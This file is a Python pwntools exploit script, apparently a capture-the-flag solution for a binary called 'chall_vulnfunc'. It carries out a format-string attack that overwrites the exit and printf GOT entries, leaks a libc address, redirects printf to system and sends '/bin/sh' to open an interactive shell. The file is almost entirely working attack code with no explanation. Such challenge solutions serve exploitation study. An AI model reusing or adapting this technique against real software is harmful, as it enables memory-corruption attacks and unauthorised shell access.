from pwn import *

bin_file = "./chall_vulnfunc"
context(os = 'linux', arch = 'amd64')

binf = ELF(bin_file)
addr_main = binf.functions['main'].address
addr_got_exit = binf.got['exit']
addr_got_printf = binf.got['printf']

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
offset_libc_read    = libc.functions['read'].address


def attack(conn):
    hex_main = hex(addr_main)
        
    offset  = int(hex_main[2:4], 16)

    buf1  = b'%'        
    buf1 += str(offset).encode()
    buf1 += b'c%10$hn'
    
    offset  = int(hex_main[4:8], 16) - offset

    buf1 += b'%'
    buf1 += str(offset).encode()
    buf1 += b'c%9$hn'

    buf1 += b'a'*((len(buf1)//0x8+1)*len('a')*0x8- len(buf1))

    info('send {}'.format(buf1))
    # print(len(buf1), buf1)

    buf1 += pack(addr_got_exit).ljust(0x8, b'\x00')
    buf1 += pack(addr_got_exit+0x2).ljust(0x8, b'\x00')
    
    conn.sendafter(b'message\n', buf1)    
    # print(conn.recvall())

    buf2 = b'%3$p'
    conn.sendlineafter(b'message\n', buf2)    
    ret = conn.recvline()
    libc_base = ret[2:-1]
    print(ret[2:-1])
    libc.address = int((libc_base.decode()), 16) - 0x12
    print(hex(libc.address))
    addr_libc_system = libc.functions['system'].address
    print(hex(addr_libc_system))
    
    # buf3  = '%{}c'.format()
    # buf3 += str(offset).encode()
    # buf3 += 'c%10$hn'
    exploit  = '%{}c'.format((addr_libc_system >> 16) & 0xff)
    exploit += '%10$hhn'
    exploit += '%{}c'.format((addr_libc_system & 0xffff) - ((addr_libc_system >> 16) & 0xff))
    exploit += '%11$hn'
    exploit  = exploit.ljust(0x20, 'x').encode()
    exploit += flat(addr_got_printf+2, addr_got_printf) # 10, 11    
    offset  = int(hex_main[4:8], 16) - offset

    conn.sendafter('message\n', exploit)
    conn.sendafter('message\n', b'/bin/sh')
    
def main():
    conn = process(bin_file)
    # conn = gdb.debug(bin_file)
    attack(conn)
    conn.interactive()


if __name__=="__main__":
    main()
